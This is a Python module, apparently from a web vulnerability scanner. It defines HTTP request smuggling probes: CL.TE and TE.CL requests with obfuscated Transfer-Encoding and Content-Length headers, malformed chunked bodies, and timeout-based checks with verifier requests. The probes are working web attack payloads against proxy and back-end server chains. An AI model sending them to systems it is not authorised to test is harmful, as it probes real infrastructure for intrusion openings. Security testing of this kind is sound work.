from .lists import LISTS

PAYLOADS = [
    {
        'name': 'HTTP Request Smuggling',
        'methods': ['GET', 'POST', 'DELETE', 'PUT', 'HEAD'], # Head is a bit exotic, but i think it could work if it's treated like a POST
        'http_version': '1.1',
        'headers': [
            'Content-Type: application/x-www-form-urlencoded',
        ],
        'timeout': 7,
        'payloads': [
            *[{
                'name': 'CL.TE with obfuscated TE',
                'requests': [
                    {
                        'headers': [
                            te_header,
                            'Content-Length: 4'
                        ],
                        'body': '1\r\nA\r\nQ',
                    }
                ],
                'check': lambda r: r == 'timeout' or (r.time > 5 and (r.status_code >= 500 or r.status_code == 408)),
                'verifier': {
                    'timeout': 40,
                    'requests': [
                        { # allow this to run again with a signifigantly higher timeout
                            'headers': [
                                'Content-Length: 4',
                                'Transfer-Encoding: chunked',
                            ],
                            'body': '1\r\nA\r\nQ',
                        },
                        { # proxy should just send back an error right away bc frontend server sends full invalid chunked body
                            'headers': [
                                'Content-Length: 7',
                                'Transfer-Encoding: chunked',
                            ],
                            'body': '1\r\nA\r\nQ',
                        },
                    ],
                    # r.time > 5, still low in case proxy timeout is set
                    'check': lambda r1, r2: (r1 == 'timeout' or (r1.time > 5 and r1.status_code >= 500) or r1.status_code == 408) and (r2 != 'timeout' and r2.status_code < 502 and r2.status_code != 400),
                }
            } for te_header in LISTS['te_headers']],



            *[{
                'name': 'TE.CL with obfuscated TE',
                'requests': [
                    {
                        'headers': [
                            te_header,
                            'Content-Length: 6'
                        ],
                        'body': '0\r\n\r\nX',
                    }
                ],
                'check': lambda r: r == 'timeout' or (r.time > 5 and (r.status_code >= 500 or r.status_code == 408)),
                'verifier': {
                    'timeout': 40,
                    'requests': [
                        {
                            'headers': [
                                'Content-Length: 6',
                                te_header,
                            ],
                            'body': '0\r\n\r\nX',
                        },
                        { # should just be fine, nothing clever here
                            'headers': [
                                'Content-Length: 13',
                                te_header,
                            ],
                            'body': '3\r\nX=1\r\n0\r\n\r\n',
                        },
                    ],
                    'check': lambda r1, r2: (r1 == 'timeout' or (r1.time > 5 and r1.status_code >= 500) or r1.status_code == 408) and (r2 != 'timeout' and r2.status_code < 502 and r2.status_code != 400),
                }
            } for te_header in LISTS['te_headers']],



            *[{
                'name': 'TE.CL with obfuscated TE and CL',
                'requests': [
                    {
                        'headers': [headers.replace('CL', '6')],
                        'body': '0\r\n\r\nX',
                    }
                ],
                'check': lambda r: r == 'timeout' or (r.time > 5 and (r.status_code >= 500 or r.status_code == 408)),
                'verifier': {
                    'timeout': 40,
                    'requests': [
                        {
                            'headers': [headers.replace('CL', '6')],
                            'body': '0\r\n\r\nX',
                        },
                        { # should just be fine, nothing clever here
                            'headers': [headers.replace('CL', '13')],
                            'body': '3\r\nX=1\r\n0\r\n\r\n',
                        },
                    ],
                    'check': lambda r1, r2: (r1 == 'timeout' or (r1.time > 5 and r1.status_code >= 500) or r1.status_code == 408) and (r2 != 'timeout' and r2.status_code < 502 and r2.status_code != 400),
                }
            } for headers in LISTS['obf_cl_te_headers']],



            *[{
                'name': 'CL.TE with obfuscated TE and CL',
                'requests': [
                    {
                        'headers': [headers.replace('CL', '4')],
                        'body': '1\r\nA\r\nQ',
                    }
                ],
                'check': lambda r: r == 'timeout' or (r.time > 5 and (r.status_code >= 500 or r.status_code == 408)),
                'verifier': {
                    'timeout': 40,
                    'requests': [
                        { # allow this to run again with a signifigantly higher timeout
                            'headers': [headers.replace('CL', '4')],
                            'body': '1\r\nA\r\nQ',
                        },
                        { # proxy should just send back an error right away bc frontend server sends full invalid chunked body
                            'headers': [headers.replace('CL', '7')],
                            'body': '1\r\nA\r\nQ',
                        },
                    ],
                    # r.time > 5, still low in case proxy timeout is set
                    'check': lambda r1, r2: (r1 == 'timeout' or (r1.time > 5 and r1.status_code >= 500) or r1.status_code == 408) and (r2 != 'timeout' and r2.status_code < 502 and r2.status_code != 400),
                }
            } for headers in LISTS['obf_cl_te_headers']],
        ]
    }
]
        
